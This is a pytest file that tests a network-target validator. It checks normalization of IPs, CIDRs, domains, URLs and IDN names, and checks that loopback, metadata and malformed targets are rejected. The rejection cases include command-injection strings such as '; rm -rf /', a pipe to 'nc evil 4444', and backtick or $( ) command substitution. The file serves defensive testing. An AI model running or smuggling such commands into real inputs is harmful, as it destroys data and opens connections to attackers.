from __future__ import annotations

import pytest

from core.target_validator import InvalidTarget, normalize_target


@pytest.mark.parametrize(
    "raw,kind,value",
    [
        ("10.0.0.1", "ip", "10.0.0.1"),
        ("10.0.0.0/24", "cidr", "10.0.0.0/24"),
        ("Example.COM", "domain", "example.com"),
        ("https://Example.com:8443/path?q=1", "url", "https://example.com:8443/path?q=1"),
        ("fe80::1/64".replace("fe80", "2001:db8"), "cidr", "2001:db8::/64"),
    ],
)
def test_valid_targets(raw, kind, value):
    nt = normalize_target(raw)
    assert nt.kind == kind
    assert nt.value == value


@pytest.mark.parametrize(
    "raw",
    [
        "127.0.0.1",
        "::1",
        "localhost",
        "169.254.169.254",
        "0.0.0.0",  # noqa: S104 — test input: the validator must REJECT bind-to-any
        "224.0.0.1",
    ],
)
def test_unsafe_targets_rejected_by_default(raw):
    with pytest.raises(InvalidTarget):
        normalize_target(raw)


def test_loopback_allowed_when_opted_in():
    assert normalize_target("127.0.0.1", allow_loopback=True).kind == "ip"
    assert normalize_target("localhost", allow_loopback=True).value == "localhost"


@pytest.mark.parametrize(
    "raw",
    [
        "",
        "   ",
        "10.0.0.1; rm -rf /",
        "example.com|nc evil 4444",
        "example.com `whoami`",
        "$(id)",
        "not a host",
        "300.300.300.300",
    ],
)
def test_garbage_rejected(raw):
    with pytest.raises(InvalidTarget):
        normalize_target(raw)


def test_private_block_when_disallowed():
    with pytest.raises(InvalidTarget):
        normalize_target("10.0.0.0/8", allow_private=False)


def test_idn_normalized_to_punycode():
    nt = normalize_target("bücher.example")
    assert nt.kind == "domain"
    assert nt.value == "xn--bcher-kva.example"
